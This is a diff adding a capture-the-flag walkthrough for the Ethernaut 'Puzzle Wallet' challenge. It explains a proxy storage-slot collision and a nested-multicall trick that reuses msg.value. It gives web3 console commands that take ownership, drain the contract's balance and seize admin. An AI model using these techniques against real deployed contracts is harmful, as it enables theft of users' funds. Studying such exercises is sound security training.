@@ -863,3 +863,120 @@ Check Balance: (await contract.balanceOf(await contract.token2(), instance)).toS
 ```
 
 
+# 24. [Challenge 24: Puzzle Wallet](https://ethernaut.openzeppelin.com/level/0xe13a4a46C346154C41360AAe7f070943F67743c9)
+
+Tasks:
+- You'll need to hijack this wallet to become the admin of the proxy.
+
+**Solution:** \
+To Solve in console:
+
+1. Since, delegatecall is context preserving, the context is taken from PuzzleProxy. Meaning, any state read or write in storage would happen in PuzzleProxy at a corresponding slot, instead of PuzzleWallet.
+
+Compare the storage variables at slots:
+```
+slot | PuzzleWallet  -  PuzzleProxy
+----------------------------------
+ 0   |   owner      <-  pendingAdmin
+ 1   |   maxBalance <-  admin
+```
+Accordingly, any write to pendingAdmin in PuzzleProxy would be reflected by owner in PuzzleWallet because they are at same storage slot, 0!
+
+And that means if we set pendingAdmin to player in PuzzleProxy (through proposeNewAdmin method), player is automatically owner in PuzzleWallet! That's exactly what we'll do. Although contract instance provided web3js API, doesn't expose the proposeNewAdmin method, we can alway encode signature of function call and send transaction to the contract:
+```
+functionSignature = {
+    name: 'proposeNewAdmin',
+    type: 'function',
+    inputs: [
+        {
+            type: 'address',
+            name: '_newAdmin'
+        }
+    ]
+}
+
+params = [player]
+
+data = web3.eth.abi.encodeFunctionCall(functionSignature, params)
+
+await web3.eth.sendTransaction({from: player, to: instance, data})
+
+```
+2. player is now owner. Verify by:
+```
+await contract.owner() === player
+
+// Output: true
+```
+3. Now, since we're owner let's whitelist us, player:
+```
+await contract.addToWhitelist(player)
+```
+4. Okay, so now player can call onlyWhitelisted guarded methods.
+
+Also, note from the storage slot table above that admin and maxBalance also correspond to same slot (slot 1). We can write to admin if in some way we can write to maxBalance the address of player.
+
+Two methods alter maxBalance - init and setMaxBalance. init shows no hope as it requires current maxBalance value to be zero. So, let's focus on setMaxBalance.
+
+setMaxBalance can only set new maxBalance only if the contract's balance is 0. Check balance:
+```
+await getBalance(contract.address)
+
+// Output: 0.001
+```
+5. Bad luck! It's non-zero. Can we somehow take out the contract's balance? Only method that does so, is execute, but contract tracks each user's balance through balances such that you can only withdraw what you deposited. We need some way to crack the contract's accounting mechanism so that we can withdraw more than deposited and hence drain contract's balance.
+
+A possible way is to somehow call deposit with same msg.value multiple times within the same transaction. Hmmm...the developers of this contract did write logic to batch multiple transactions into one transaction to save gas costs. And this is what multicall method is for. Maybe we can exploit it?
+
+But wait! multicall actually extracts function selector (which is first 4 bytes from signature) from the data and makes sure that deposit is called only once per transaction!
+```
+assembly {
+    selector := mload(add(_data, 32))
+}
+if (selector == this.deposit.selector) {
+    require(!depositCalled, "Deposit can only be called once");
+    // Protect against reusing msg.value
+    depositCalled = true;
+}
+```
+
+We need another way. Think deeper...we can only call deposit only once in a multicall...but what if call a multicall that calls multiple multicalls and each of these multicalls call deposit once...aha! That'd be totally valid since each of these multiple multicalls will check their own separate depositCalled bools.
+
+The contract balance currently is 0.001 eth. If we're able to call deposit two times through two multicalls in same transaction. The balances[player] would be registered from 0 eth to 0.002 eth, but in reality only 0.001 eth will be actually sent! Hence total balance of contract is in reality 0.002 eth but accounting in balances would think it's 0.003 eth. Anyway, player is now eligible to take out 0.002 eth from contract and drain it as a result. Let's begin.
+
+Here's our call inception (calls within calls within call!)
+```
+ multicall
+               |
+        -----------------
+        |               |
+     multicall        multicall
+        |                 |
+      deposit          deposit 
+```
+6. Get function call encodings:
+```
+// deposit() method
+depositData = await contract.methods["deposit()"].request().then(v => v.data)
+
+// multicall() method with param of deposit function call signature
+multicallData = await contract.methods["multicall(bytes[])"].request([depositData]).then(v => v.data)
+```
+Now we call multicall which will call two multicalls and each of these two will call deposit once each. Send value of 0.001 eth with transaction:
+```
+await contract.multicall([multicallData, multicallData], {value: toWei('0.001')})
+```
+7. player balance now must be 0.001 eth * 2 i.e. 0.002 eth. Which is equal to contract's total balance at this time. Withdraw same amount by execute:
+```
+await contract.execute(player, toWei('0.002'), 0x0)
+```
+8. By now, contract's balance must be zero. Verify:
+```
+await getBalance(contract.address)
+
+// Output: '0'
+```
+9. Finally we can call setMaxBalance to set maxBalance and as a consequence of storage collision, set admin to player:
+```
+await contract.setMaxBalance(player)
+```
